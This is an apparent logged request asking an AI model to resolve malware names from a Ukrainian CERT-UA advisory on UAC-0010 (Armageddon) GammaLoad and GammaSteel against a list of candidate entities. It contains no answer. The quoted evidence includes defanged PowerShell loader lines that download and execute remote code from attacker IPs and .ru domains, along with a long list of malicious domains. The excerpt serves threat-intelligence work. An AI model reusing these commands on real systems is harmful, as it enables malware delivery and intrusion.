=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. z.ps1
E2. GammaLoad [aka GammaLoad.PS1]
E3. TRYxaEbX.ps1
E4. GraphSteel
E5. GammaLoad.PS1_v2
E6. stage1.ps1
E7. stage2.ps1
E8. OUTSTEEL
E9. csrss.exe
E10. HTA file
E11. .NET Framework
E12. Ngrok
E13. python-requests
E14. MarsStealer
E15. WhisperPack
E16. GrimPlant
E17. HTM dropper
E18. FTPGetter
E19. JesterStealer
E20. Hashcat
E21. NTDSDumpEx
E22. needrestart
E23. Meterpreter
E24. RDPWrapper
E25. PowerShell [aka powershell.exe]
E26. b.exe
E27. 223329.exe
E28. POWERGAP
E29. wscript.exe
E30. 62ea.exe
E31. SPECTR.Shell
E32. 966449.exe
E33. MS PowerPoint
E34. GammaSteel.NET
E35. HarvesterX
E36. PowerShell (powershell.exe)
E37. GammaSteel.PS1
E38. kopratiso.ru
E39. acteran.ru
E40. bilitora.ru
E41. fishitor.ru
E42. apoxipodes.ru
E43. dodortar.ru
E44. tiloraso.ru
E45. a0322810.xsph.ru
E46. billyhot.ru
E47. dod-upload.dodortar.ru
E48. tortunas.ru
E49. candidar.ru
E50. lnk-upload.dodortar.ru
E51. motocheck.in
E52. stormpredictor.host
E53. meteolink.host
E54. successilin.top
E55. xsph.ru
E56. erwini.ru
E57. mulleti.ru
E58. bul-opros.top
E59. iol.pt
E60. toknowall.com
E61. gopoppers.com
E62. podologaneri.it
E63. co-opros.top
E64. nitikora.ru
E65. districoperav.icu
E66. potrakit.ru
E67. giraffe-tour.ru
E68. rivierafamily.com
E69. tridiuma.ru
E70. yandex.ru
E71. varanasiclick.ru
E72. olei.ro
E73. jevejosader.top
E74. enlamentedeunasesor.com
E75. milotrad.ru
E76. milotraf.ru
E77. s8.h.mchost.ru
E78. aspe.ro
E79. omyce.ru
E80. pastebin.com
E81. leonardis.ru
E82. jokotras.ru
E83. afi-opros.top
E84. nikotod.ru
E85. mitraseo.hol.es
E86. parodadoca.ru
E87. marmaris.com.ua
E88. nx0.ru
E89. ncscc.gov.ua
E90. www.msftncsi.com
E91. tas-gos.top
E92. staystrongjewels.com
E93. wi-opros.top
E94. xcasinobonuses.net
E95. viewdns.net
E96. servebeer.com
E97. evil.server.com
E98. 3utilities.com
E99. gotdns.ch
E100. agreminj.com
E101. whoer.net
E102. airmauritiusticket.com
E103. cloudflare-dns.com
E104. plexbd.net
E105. bounceme.net
E106. ddns.net
E107. sytes.net
E108. brunoboys.net
E109. dcshost.net
E110. ns.ns2-dns.com
E111. d-upl.ddns.net
E112. ns2-dns.com
E113. gov-ua.info
E114. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E115. ns.ns3-dns.com
E116. dyndns.com
E117. freedynamicdns.org
E118. arentuk.com
E119. www.facebook.com
E120. winchconstruction.com
E121. www.michiganmastereltiempo.com
E122. www.symantec.com
E123. kohhd.com
E124. fluoxi.com
E125. atlantar.ru
E126. motoristo.ru
E127. moolin.ru
E128. bubenci.ru
E129. callsol.ru
E130. clipperso.ru
E131. cooperi.ru
E132. detroito.ru
E133. farafauler.ru
E134. flayga.ru
E135. ganara.ru
E136. hawksi.ru
E137. hofsteder.ru
E138. kilitro.ru
E139. kurapat.ru
E140. lnasfe.ru
E141. lopasts.ru
E142. mafirti.ru
E143. metanat.ru
E144. mitlubald.ru
E145. paparat.ru
E146. pasamart.ru
E147. qkcew.ru
E148. rncsq.ru
E149. tarlit.ru
E150. tbwelo.ru
E151. wicksl.ru
E152. xcqef.ru
E153. nxkad.ru
E154. dnslookup.seowebchecker.com
E155. tools.nexcess.net
E156. viewdns.info
E157. www.portcheckers.com
E158. lover.printing82.detroito.ru
Mentions:
M1. "GammaSteel.PS1" (Software) — options: E1, E2, E3, E4 — ctx: S1
M2. "GammaSteel.NET" (Software) — options: E4, E11, E2, E12 — ctx: S1
